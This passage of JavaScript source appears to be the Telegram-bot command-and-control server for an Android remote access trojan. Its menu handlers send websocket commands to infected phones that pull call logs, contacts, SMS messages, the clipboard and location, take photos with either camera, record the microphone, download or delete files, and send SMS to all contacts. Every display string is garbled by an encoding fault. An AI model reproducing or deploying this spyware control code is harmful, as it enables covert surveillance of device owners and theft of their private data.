                appBot.sendMessage(id, '掳鈥� 饾檸饾櫄饾櫋饾櫄饾櫂饾櫓 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄 饾櫓饾櫎 饾櫄饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫄饾櫍饾櫃', {
                    "reply_markup": {
                        "inline_keyboard": deviceListKeyboard,
                    },
                })
            }
        }
    } else {
        appBot.sendMessage(id, '掳鈥� 饾檵饾櫄饾櫑饾櫌饾櫈饾櫒饾櫒饾櫈饾櫎饾櫍 饾櫃饾櫄饾櫍饾櫈饾櫄饾櫃')
    }
})
appBot.on("callback_query", (callbackQuery) => {
    const msg = callbackQuery.message;
    const data = callbackQuery.data
    const commend = data.split(':')[0]
    const uuid = data.split(':')[1]
    console.log(uuid)
    if (commend == 'device') {
        appBot.editMessageText(`掳鈥� 饾檸饾櫄饾櫋饾櫄饾櫂饾櫓 饾櫂饾櫎饾櫌饾櫌饾櫄饾櫍饾櫃 饾櫅饾櫎饾櫑 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄 : <b>${appClients.get(data.split(':')[1]).model}</b>`, {
            width: 10000,
            chat_id: id,
            message_id: msg.message_id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: '饾樇饾櫏饾櫏饾櫒', callback_data: `apps:${uuid}`},
                        {text: '饾樋饾櫄饾櫕饾櫈饾櫂饾櫄 饾櫈饾櫍饾櫅饾櫎', callback_data: `device_info:${uuid}`}
                    ],
                    [
                        {text: '饾檪饾櫄饾櫓 饾櫅饾櫈饾櫋饾櫄', callback_data: `file:${uuid}`},
                        {text: '饾樋饾櫄饾櫋饾櫄饾櫓饾櫄 饾櫅饾櫈饾櫋饾櫄', callback_data: `delete_file:${uuid}`}
                    ],
                    [
                        {text: '饾樉饾櫋饾櫈饾櫏饾櫁饾櫎饾櫀饾櫑饾櫃', callback_data: `clipboard:${uuid}`},
                        {text: '饾檲饾櫈饾櫂饾櫑饾櫎饾櫏饾櫇饾櫎饾櫍饾櫄', callback_data: `microphone:${uuid}`},
                    ],
                    [
                        {text: '饾檲饾櫀饾櫈饾櫍 饾櫂饾櫀饾櫌饾櫄饾櫑饾櫀', callback_data: `camera_main:${uuid}`},
                        {text: '饾檸饾櫄饾櫋饾櫅饾櫈饾櫄 饾櫂饾櫀饾櫌饾櫄饾櫑饾櫀', callback_data: `camera_selfie:${uuid}`}
                    ],
                    [
                        {text: '饾檱饾櫎饾櫂饾櫀饾櫓饾櫈饾櫎饾櫍', callback_data: `location:${uuid}`},
                        {text: '饾檹饾櫎饾櫀饾櫒饾櫓', callback_data: `toast:${uuid}`}
                    ],
                    [
                        {text: '饾樉饾櫀饾櫋饾櫋饾櫒', callback_data: `calls:${uuid}`},
                        {text: '饾樉饾櫎饾櫍饾櫓饾櫀饾櫂饾櫓饾櫒', callback_data: `contacts:${uuid}`}
                    ],
                    [
                        {text: '饾檻饾櫈饾櫁饾櫑饾櫀饾櫓饾櫄', callback_data: `vibrate:${uuid}`},
                        {text: '饾檸饾櫇饾櫎饾櫖 饾櫍饾櫎饾櫓饾櫈饾櫅饾櫈饾櫂饾櫀饾櫓饾櫈饾櫎饾櫍', callback_data: `show_notification:${uuid}`}
                    ],
                    [
                        {text: '饾檲饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄饾櫒', callback_data: `messages:${uuid}`},
                        {text: '饾檸饾櫄饾櫍饾櫃 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄', callback_data: `send_message:${uuid}`}
                    ],
                    [
                        {text: '饾檵饾櫋饾櫀饾櫘 饾櫀饾櫔饾櫃饾櫈饾櫎', callback_data: `play_audio:${uuid}`},
                        {text: '饾檸饾櫓饾櫎饾櫏 饾櫀饾櫔饾櫃饾櫈饾櫎', callback_data: `stop_audio:${uuid}`},
                    ],
                    [
                        {
                            text: '饾檸饾櫄饾櫍饾櫃 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫓饾櫎 饾櫀饾櫋饾櫋 饾櫂饾櫎饾櫍饾櫓饾櫀饾櫂饾櫓饾櫒',
                            callback_data: `send_message_to_all:${uuid}`
                        }
                    ],
                ]
            },
            parse_mode: "HTML"
        })
    }
    if (commend == 'calls') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('calls');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'contacts') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('contacts');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('messages');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'apps') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('apps');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'device_info') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('device_info');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'clipboard') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('clipboard');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_main') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_main');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'camera_selfie') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('camera_selfie');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'location') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('location');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'vibrate') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('vibrate');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'stop_audio') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) {
                ws.send('stop_audio');
            }
        });
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檾饾櫎饾櫔饾櫑 饾櫑饾櫄饾櫐饾櫔饾櫄饾櫒饾櫓 饾櫈饾櫒 饾櫎饾櫍 饾櫏饾櫑饾櫎饾櫂饾櫄饾櫒饾櫒\n\n' +
            '鈥� 蕪岽忈礈 岽∩熓� 蕗岽囜磩岽嚿礌岽� 岽� 蕗岽囮湵岽樶磸纱隃贬磭 瑟纱 岽浭溼磭 纱岽噚岽� 隃搬磭岽� 岽嶀磸岽嶀磭纱岽涥湵',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["饾樉饾櫎饾櫍饾櫍饾櫄饾櫂饾櫓饾櫄饾櫃 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄饾櫒"], ["饾檧饾櫗饾櫄饾櫂饾櫔饾櫓饾櫄 饾櫂饾櫎饾櫌饾櫌饾櫀饾櫍饾櫃"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (commend == 'send_message') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id, '掳鈥� 饾檵饾櫋饾櫄饾櫀饾櫒饾櫄 饾櫑饾櫄饾櫏饾櫋饾櫘 饾櫓饾櫇饾櫄 饾櫍饾櫔饾櫌饾櫁饾櫄饾櫑 饾櫓饾櫎 饾櫖饾櫇饾櫈饾櫂饾櫇 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫒饾櫄饾櫍饾櫃 饾櫓饾櫇饾櫄 饾檸饾檲饾檸\n\n' +
            '鈥⑸湴 蕪岽忈礈 岽♂磤纱岽� 岽涐磸 隃贬磭纱岽� 隃贬磵隃� 岽涐磸 薀岽忈磩岽�薀 岽勧磸岽溕瘁礇蕗蕪 纱岽溼磵蕶岽囀�隃�, 蕪岽忈礈 岽勧磤纱 岽嚿瘁礇岽囀� 岽浭溼磭 纱岽溼磵蕶岽囀� 岽∩礇蕼 岽⑨磭蕗岽� 岽�岽� 岽浭溼磭 蕶岽嚿⑸瓷瓷瓷�, 岽忈礇蕼岽囀�岽∩湵岽� 岽嚿瘁礇岽囀� 岽浭溼磭 纱岽溼磵蕶岽囀� 岽∩礇蕼 岽浭溼磭 岽勧磸岽溕瘁礇蕗蕪 岽勧磸岽呩磭',
            {reply_markup: {force_reply: true}})
        currentUuid = uuid
    }
    if (commend == 'send_message_to_all') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫒饾櫄饾櫍饾櫃 饾櫓饾櫎 饾櫀饾櫋饾櫋 饾櫂饾櫎饾櫍饾櫓饾櫀饾櫂饾櫓饾櫒\n\n' +
            '鈥� 蕶岽� 岽勧磤蕗岽囮湴岽準� 岽浭溼磤岽� 岽浭溼磭 岽嶀磭隃标湵岽�散岽� 岽∩熓� 纱岽忈礇 蕶岽� 隃贬磭纱岽� 瑟隃� 岽浭溼磭 纱岽溼磵蕶岽囀� 岽応湴 岽勈溼磤蕗岽�岽勧礇岽囀�隃� 瑟纱 蕪岽忈礈蕗 岽嶀磭隃标湵岽�散岽� 瑟隃� 岽嶀磸蕗岽� 岽浭溼磤纱 岽�薀薀岽忈础岽囜磪',
            {reply_markup: {force_reply: true}}
        )
        currentUuid = uuid
    }
    if (commend == 'file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫏饾櫀饾櫓饾櫇 饾櫎饾櫅 饾櫓饾櫇饾櫄 饾櫅饾櫈饾櫋饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫃饾櫎饾櫖饾櫍饾櫋饾櫎饾櫀饾櫃\n\n' +
            '鈥� 蕪岽忈礈 岽呩磸 纱岽忈礇 纱岽囜磭岽� 岽涐磸 岽嚿瘁礇岽囀� 岽浭溼磭 隃搬礈薀薀 隃吧熱磭 岽樶磤岽浭�, 岽娽礈隃贬礇 岽嚿瘁礇岽囀� 岽浭溼磭 岽嶀磤瑟纱 岽樶磤岽浭�. 隃搬磸蕗 岽噚岽�岽嶀礃薀岽�, 岽嚿瘁礇岽囀�<b> DCIM/Camera </b> 岽涐磸 蕗岽囜磩岽嚿礌岽� 散岽�薀薀岽囀�蕪 隃吧熱磭隃�.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'delete_file') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫏饾櫀饾櫓饾櫇 饾櫎饾櫅 饾櫓饾櫇饾櫄 饾櫅饾櫈饾櫋饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫃饾櫄饾櫋饾櫄饾櫓饾櫄\n\n' +
            '鈥� 蕪岽忈礈 岽呩磸 纱岽忈礇 纱岽囜磭岽� 岽涐磸 岽嚿瘁礇岽囀� 岽浭溼磭 隃搬礈薀薀 隃吧熱磭 岽樶磤岽浭�, 岽娽礈隃贬礇 岽嚿瘁礇岽囀� 岽浭溼磭 岽嶀磤瑟纱 岽樶磤岽浭�. 隃搬磸蕗 岽噚岽�岽嶀礃薀岽�, 岽嚿瘁礇岽囀�<b> DCIM/Camera </b> 岽涐磸 岽呩磭薀岽囜礇岽� 散岽�薀薀岽囀�蕪 隃吧熱磭隃�.',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'microphone') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫇饾櫎饾櫖 饾櫋饾櫎饾櫍饾櫆 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫇饾櫄 饾櫌饾櫈饾櫂饾櫑饾櫎饾櫏饾櫇饾櫎饾櫍饾櫄 饾櫓饾櫎 饾櫁饾櫄 饾櫑饾櫄饾櫂饾櫎饾櫑饾櫃饾櫄饾櫃\n\n' +
            '鈥� 纱岽忈礇岽� 岽浭溼磤岽� 蕪岽忈礈 岽嶀礈隃贬礇 岽嚿瘁礇岽囀� 岽浭溼磭 岽浬磵岽� 纱岽溼磵岽囀�瑟岽勧磤薀薀蕪 瑟纱 岽溕瓷礇隃� 岽応湴 隃贬磭岽勧磸纱岽呹湵',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'toast') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫓饾櫇饾櫀饾櫓 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫀饾櫏饾櫏饾櫄饾櫀饾櫑 饾櫎饾櫍 饾櫓饾櫇饾櫄 饾櫓饾櫀饾櫑饾櫆饾櫄饾櫓 饾櫃饾櫄饾櫕饾櫈饾櫂饾櫄\n\n' +
            '鈥� 岽涐磸岽�隃贬礇 瑟隃� 岽� 隃笔溼磸蕗岽� 岽嶀磭隃标湵岽�散岽� 岽浭溼磤岽� 岽�岽樶礃岽囜磤蕗隃� 岽徤� 岽浭溼磭 岽呩磭岽犐磩岽� 隃贬磩蕗岽囜磭纱 隃搬磸蕗 岽� 隃搬磭岽� 隃贬磭岽勧磸纱岽呹湵',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'show_notification') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫌饾櫄饾櫒饾櫒饾櫀饾櫆饾櫄 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫀饾櫏饾櫏饾櫄饾櫀饾櫑 饾櫀饾櫒 饾櫍饾櫎饾櫓饾櫈饾櫅饾櫈饾櫂饾櫀饾櫓饾櫈饾櫎饾櫍\n\n' +
            '鈥� 蕪岽忈礈蕗 岽嶀磭隃标湵岽�散岽� 岽∩熓� 蕶岽� 岽�岽樶礃岽囜磤蕗 瑟纱 岽涐磤蕗散岽囜礇 岽呩磭岽犐磩岽� 隃贬礇岽�岽涐礈隃� 蕶岽�蕗 薀瑟岽嬦磭 蕗岽嚿⑨礈薀岽�蕗 纱岽忈礇瑟隃吧磩岽�岽浬磸纱',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
    if (commend == 'play_audio') {
        appBot.deleteMessage(id, msg.message_id)
        appBot.sendMessage(id,
            '掳鈥� 饾檧饾櫍饾櫓饾櫄饾櫑 饾櫓饾櫇饾櫄 饾櫀饾櫔饾櫃饾櫈饾櫎 饾櫋饾櫈饾櫍饾櫊 饾櫘饾櫎饾櫔 饾櫖饾櫀饾櫍饾櫓 饾櫓饾櫎 饾櫏饾櫋饾櫀饾櫘\n\n' +
            '鈥� 纱岽忈礇岽� 岽浭溼磤岽� 蕪岽忈礈 岽嶀礈隃贬礇 岽嚿瘁礇岽囀� 岽浭溼磭 岽吷�岽囜磩岽� 薀瑟纱岽� 岽応湴 岽浭溼磭 岽呩磭隃鄙�岽囜磪 隃贬磸岽溕瘁磪, 岽忈礇蕼岽囀�岽∩湵岽� 岽浭溼磭 隃贬磸岽溕瘁磪 岽∩熓� 纱岽忈礇 蕶岽� 岽樖熱磤蕪岽囜磪',
            {reply_markup: {force_reply: true}, parse_mode: "HTML"}
        )
        currentUuid = uuid
    }
});
setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
    try {
        axios.get(address).then(r => "")
    } catch (e) {
    }
}, 5000)
appServer.listen(process.env.PORT || 8999);